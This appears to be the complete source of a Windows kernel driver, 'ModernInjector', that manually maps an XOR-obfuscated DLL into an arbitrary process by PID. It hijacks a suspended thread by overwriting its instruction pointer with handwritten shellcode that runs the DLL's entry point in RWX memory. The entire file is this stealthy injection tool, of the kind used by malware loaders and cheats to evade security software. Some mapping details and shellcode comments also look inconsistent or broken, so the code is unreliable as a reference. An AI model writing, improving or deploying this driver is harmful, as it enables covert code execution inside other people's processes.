#include <ntifs.h>
#include <ntimage.h>
#include <ntstrsafe.h>

// Function pointer types for dynamic resolution
typedef NTSTATUS (*t_KeGetContextThread)(PETHREAD Thread, PCONTEXT Context);
typedef NTSTATUS (*t_KeSetContextThread)(PETHREAD Thread, PCONTEXT Context);
typedef NTSTATUS (*t_KeSuspendThread)(PETHREAD Thread);
typedef ULONG (*t_KeResumeThread)(PETHREAD Thread);
typedef PETHREAD (*t_PsGetNextProcessThread)(PEPROCESS Process, PETHREAD Thread);

// Global function pointers
t_KeGetContextThread pKeGetContextThread = NULL;
t_KeSetContextThread pKeSetContextThread = NULL;
t_KeSuspendThread pKeSuspendThread = NULL;
t_KeResumeThread pKeResumeThread = NULL;
t_PsGetNextProcessThread pPsGetNextProcessThread = NULL;

extern "C" NTSTATUS MmCopyVirtualMemory(
    PEPROCESS SourceProcess,
    PVOID SourceAddress,
    PEPROCESS TargetProcess,
    PVOID TargetAddress,
    SIZE_T BufferSize,
    KPROCESSOR_MODE PreviousMode,
    PSIZE_T NumberOfBytesCopied
);

// Helper to resolve functions at runtime
void ResolveFunctions() {
    UNICODE_STRING name;
    
    RtlInitUnicodeString(&name, L"KeGetContextThread");
    pKeGetContextThread = (t_KeGetContextThread)MmGetSystemRoutineAddress(&name);
    
    RtlInitUnicodeString(&name, L"KeSetContextThread");
    pKeSetContextThread = (t_KeSetContextThread)MmGetSystemRoutineAddress(&name);
    
    RtlInitUnicodeString(&name, L"KeSuspendThread");
    pKeSuspendThread = (t_KeSuspendThread)MmGetSystemRoutineAddress(&name);
    
    RtlInitUnicodeString(&name, L"KeResumeThread");
    pKeResumeThread = (t_KeResumeThread)MmGetSystemRoutineAddress(&name);

    RtlInitUnicodeString(&name, L"PsGetNextProcessThread");
    pPsGetNextProcessThread = (t_PsGetNextProcessThread)MmGetSystemRoutineAddress(&name);
}

#define DEVICE_NAME L"\\Device\\ModernInjector"
#define SYMLINK_NAME L"\\DosDevices\\ModernInjector"
#define IOCTL_INJECT_DLL CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define POOL_TAG 'DLLX'

struct InjectionRequest {
    ULONG TargetPid;
    WCHAR DllPath[260];
};

constexpr UCHAR XOR_KEY = 0x5A;

inline void XorBuffer(PUCHAR buffer, SIZE_T size, UCHAR key) {
    for (SIZE_T i = 0; i < size; i++) {
        buffer[i] ^= key;
    }
}

struct HandleCloser {
    HANDLE handle;
    HandleCloser(HANDLE h) : handle(h) {}
    ~HandleCloser() { if (handle) ZwClose(handle); }
};

PETHREAD FindTargetThread(PEPROCESS process) {
    if (!pPsGetNextProcessThread) return NULL;
    
    PETHREAD thread = pPsGetNextProcessThread(process, NULL);
    while (thread) {
        // We want a thread that is in UserMode and not currently being terminated
        if (!PsIsThreadTerminating(thread)) {
            return thread;
        }
        thread = pPsGetNextProcessThread(process, thread);
    }
    return NULL;
}

NTSTATUS InjectDll(PEPROCESS targetProcess, PUCHAR dllData, SIZE_T dllSize) {
    NTSTATUS status = STATUS_SUCCESS;
    PVOID remoteBase = nullptr;
    SIZE_T regionSize = dllSize;

    auto* dosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(dllData);
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        DbgPrint("Invalid DOS signature\n");
        return STATUS_INVALID_IMAGE_FORMAT;
    }
    auto* ntHeaders = reinterpret_cast<PIMAGE_NT_HEADERS>(dllData + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
        DbgPrint("Invalid NT signature\n");
        return STATUS_INVALID_IMAGE_FORMAT;
    }

    KAPC_STATE apcState;
    KeStackAttachProcess(targetProcess, &apcState);

    // Now attached to target process, allocate memory there
    status = ZwAllocateVirtualMemory(ZwCurrentProcess(), &remoteBase, 0, &regionSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    if (!NT_SUCCESS(status)) {
        DbgPrint("Failed to allocate memory in target: 0x%X\n", status);
        KeUnstackDetachProcess(&apcState);
        return status;
    }

    // Perform relocations on our local copy before copying to target
    ULONG_PTR delta = (ULONG_PTR)remoteBase - (ULONG_PTR)ntHeaders->OptionalHeader.ImageBase;
    if (delta != 0 && ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size) {
        auto* reloc = reinterpret_cast<PIMAGE_BASE_RELOCATION>(
            dllData + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
        while (reloc->VirtualAddress) {
            auto* relocInfo = reinterpret_cast<PUSHORT>(reloc + 1);
            ULONG numRelocs = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(USHORT);
            for (ULONG i = 0; i < numRelocs; i++) {
                if ((relocInfo[i] >> 12) == IMAGE_REL_BASED_DIR64) {
                    auto* fixup = reinterpret_cast<PULONG_PTR>(dllData + reloc->VirtualAddress + (relocInfo[i] & 0xFFF));
                    *fixup += delta;
                }
            }
            reloc = reinterpret_cast<PIMAGE_BASE_RELOCATION>(reinterpret_cast<PUCHAR>(reloc) + reloc->SizeOfBlock);
        }
    }

    // Copy headers and sections
    SIZE_T bytesCopied = 0;
    status = MmCopyVirtualMemory(IoGetCurrentProcess(), dllData, targetProcess, remoteBase, 
                                ntHeaders->OptionalHeader.SizeOfHeaders, KernelMode, &bytesCopied);
    
    if (NT_SUCCESS(status)) {
        auto* section = IMAGE_FIRST_SECTION(ntHeaders);
        for (USHORT i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
            PVOID targetAddr = (PVOID)((PUCHAR)remoteBase + section[i].VirtualAddress);
            PVOID sourceAddr = (PVOID)(dllData + section[i].PointerToRawData);
            status = MmCopyVirtualMemory(IoGetCurrentProcess(), sourceAddr, targetProcess, targetAddr,
                                        section[i].SizeOfRawData, KernelMode, &bytesCopied);
            if (!NT_SUCCESS(status)) break;
        }
    }

    KeUnstackDetachProcess(&apcState);

    if (!NT_SUCCESS(status)) {
        // Cleanup if mapping failed
        KeStackAttachProcess(targetProcess, &apcState);
        ZwFreeVirtualMemory(ZwCurrentProcess(), &remoteBase, &regionSize, MEM_RELEASE);
        KeUnstackDetachProcess(&apcState);
        return status;
    }

    // Dynamic resolution of thread functions
    if (!pKeSuspendThread || !pKeResumeThread || !pKeGetContextThread || !pKeSetContextThread || !pPsGetNextProcessThread) {
        ResolveFunctions();
    }

    if (!pKeSuspendThread || !pKeResumeThread || !pKeGetContextThread || !pKeSetContextThread) {
        DbgPrint("Error: Required thread functions could not be resolved.\n");
        return STATUS_NOT_SUPPORTED;
    }

    PETHREAD targetThread = FindTargetThread(targetProcess);
    if (!targetThread) {
        DbgPrint("Could not find a suitable thread to hijack in target process.\n");
        return STATUS_NOT_FOUND;
    }

    // Reference the thread to prevent it from being freed
    ObReferenceObject(targetThread);

    PVOID dllMain = reinterpret_cast<PVOID>(reinterpret_cast<PUCHAR>(remoteBase) + ntHeaders->OptionalHeader.AddressOfEntryPoint);
    
    status = pKeSuspendThread(targetThread);
    if (!NT_SUCCESS(status) && status != STATUS_SUSPEND_COUNT_EXCEEDED) {
        ObDereferenceObject(targetThread);
        return status;
    }
    
    CONTEXT context{};
    context.ContextFlags = CONTEXT_FULL;
    status = pKeGetContextThread(targetThread, &context);
    if (NT_SUCCESS(status)) {
        UCHAR shellcode[] = {
            0x50, 0x51, 0x52, 0x53, 0x55, 0x56, 0x57, 0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, // push all
            0x48, 0x83, 0xEC, 0x20, // sub rsp, 20
            0x48, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rcx, <dllBase> (offset 29)
            0x48, 0xC7, 0xC2, 0x01, 0x00, 0x00, 0x00,                   // mov rdx, 1
            0x4D, 0x31, 0xC0,                                           // xor r8, r8
            0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, <dllMain> (offset 46)
            0xFF, 0xD0,                                                 // call rax
            0x48, 0x83, 0xC4, 0x20, // add rsp, 20
            0x41, 0x5F, 0x41, 0x5E, 0x41, 0x5D, 0x41, 0x5C, 0x41, 0x5B, 0x41, 0x5A, 0x41, 0x59, 0x41, 0x58, 0x5F, 0x5E, 0x5D, 0x5B, 0x5A, 0x59, 0x58, // pop all
            0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, <origRip> (offset 82)
            0xFF, 0xE0 // jmp rax
        };

        // Correctly patch pointers using 8-byte copies
        *(PVOID*)(shellcode + 29) = remoteBase;
        *(PVOID*)(shellcode + 49) = dllMain;
        *(ULONG64*)(shellcode + 88) = context.Rip;

        PVOID shellcodeBase = nullptr;
        SIZE_T shellSize = sizeof(shellcode);
        
        KeStackAttachProcess(targetProcess, &apcState);
        status = ZwAllocateVirtualMemory(ZwCurrentProcess(), &shellcodeBase, 0, &shellSize,
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (NT_SUCCESS(status)) {
            MmCopyVirtualMemory(IoGetCurrentProcess(), shellcode, targetProcess, shellcodeBase, sizeof(shellcode), KernelMode, &bytesCopied);
            context.Rip = reinterpret_cast<DWORD64>(shellcodeBase);
            pKeSetContextThread(targetThread, &context);
        }
        KeUnstackDetachProcess(&apcState);
    }
    
    pKeResumeThread(targetThread);
    ObDereferenceObject(targetThread);

    DbgPrint("DLL injected into target at 0x%p\n", remoteBase);
    return status;
}

extern "C" NTSTATUS DeviceControl(PDEVICE_OBJECT deviceObject, PIRP irp) {
    auto* irpStack = IoGetCurrentIrpStackLocation(irp);
    NTSTATUS status = STATUS_SUCCESS;
    ULONG bytesReturned = 0;

    if (irpStack->Parameters.DeviceIoControl.IoControlCode == IOCTL_INJECT_DLL) {
        auto* request = reinterpret_cast<InjectionRequest*>(irp->AssociatedIrp.SystemBuffer);
        PEPROCESS targetProcess;

        status = PsLookupProcessByProcessId(reinterpret_cast<HANDLE>(request->TargetPid), &targetProcess);
        if (!NT_SUCCESS(status)) {
            DbgPrint("Failed to find process %u: 0x%X\n", request->TargetPid, status);
            goto Cleanup;
        }

        UNICODE_STRING filePath;
        RtlInitUnicodeString(&filePath, request->DllPath);
        OBJECT_ATTRIBUTES objAttr;
        InitializeObjectAttributes(&objAttr, &filePath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, nullptr, nullptr);

        HANDLE fileHandle;
        IO_STATUS_BLOCK ioStatus;
        status = ZwCreateFile(&fileHandle, GENERIC_READ, &objAttr, &ioStatus, nullptr,
            FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_OPEN,
            FILE_SYNCHRONOUS_IO_NONALERT, nullptr, 0);
        
        if (!NT_SUCCESS(status)) {
            DbgPrint("Failed to open DLL: 0x%X\n", status);
            ObDereferenceObject(targetProcess);
            goto Cleanup;
        }
        
        {
            HandleCloser closer(fileHandle);
            FILE_STANDARD_INFORMATION fileInfo;
            status = ZwQueryInformationFile(fileHandle, &ioStatus, &fileInfo, sizeof(fileInfo), FileStandardInformation);
            if (!NT_SUCCESS(status)) {
                ObDereferenceObject(targetProcess);
                goto Cleanup;
            }

#pragma warning(push)
#pragma warning(disable: 4996) 
            PUCHAR dllData = static_cast<PUCHAR>(ExAllocatePoolWithTag(PagedPool, (SIZE_T)fileInfo.EndOfFile.QuadPart, POOL_TAG));
#pragma warning(pop)
            if (!dllData) {
                ObDereferenceObject(targetProcess);
                status = STATUS_INSUFFICIENT_RESOURCES;
                goto Cleanup;
            }

            status = ZwReadFile(fileHandle, nullptr, nullptr, nullptr, &ioStatus, dllData, (ULONG)fileInfo.EndOfFile.QuadPart, nullptr, nullptr);
            if (NT_SUCCESS(status)) {
                // If it was encrypted, decrypt it here. Current logic XORs it based on XOR_KEY.
                // We'll keep one XOR here assuming the input DLL is XORed.
                XorBuffer(dllData, (SIZE_T)fileInfo.EndOfFile.QuadPart, XOR_KEY);
                status = InjectDll(targetProcess, dllData, (SIZE_T)fileInfo.EndOfFile.QuadPart);
            }

            ExFreePoolWithTag(dllData, POOL_TAG);
        }
        ObDereferenceObject(targetProcess);
    }

Cleanup:
    irp->IoStatus.Status = status;
    irp->IoStatus.Information = bytesReturned;
    IoCompleteRequest(irp, IO_NO_INCREMENT);
    return status;
}

extern "C" NTSTATUS DriverEntry(PDRIVER_OBJECT driverObject, PUNICODE_STRING registryPath) {
    UNREFERENCED_PARAMETER(registryPath);
    UNICODE_STRING deviceName, symLink;
    PDEVICE_OBJECT deviceObject;

    ResolveFunctions();

    RtlInitUnicodeString(&deviceName, DEVICE_NAME);
    NTSTATUS status = IoCreateDevice(driverObject, 0, &deviceName, FILE_DEVICE_UNKNOWN, 0, FALSE, &deviceObject);
    if (!NT_SUCCESS(status)) {
        return status;
    }

    RtlInitUnicodeString(&symLink, SYMLINK_NAME);
    IoCreateSymbolicLink(&symLink, &deviceName);

    driverObject->MajorFunction[IRP_MJ_CREATE] = driverObject->MajorFunction[IRP_MJ_CLOSE] =
        [](PDEVICE_OBJECT, PIRP irp) -> NTSTATUS {
        irp->IoStatus.Status = STATUS_SUCCESS;
        IoCompleteRequest(irp, IO_NO_INCREMENT);
        return STATUS_SUCCESS;
    };
    driverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DeviceControl;
    driverObject->DriverUnload = [](PDRIVER_OBJECT drvObj) {
        UNICODE_STRING symLink;
        RtlInitUnicodeString(&symLink, SYMLINK_NAME);
        IoDeleteSymbolicLink(&symLink);
        if (drvObj->DeviceObject) {
            IoDeleteDevice(drvObj->DeviceObject);
        }
    };

    DbgPrint("ModernInjector loaded and ready\n");
    return STATUS_SUCCESS;
}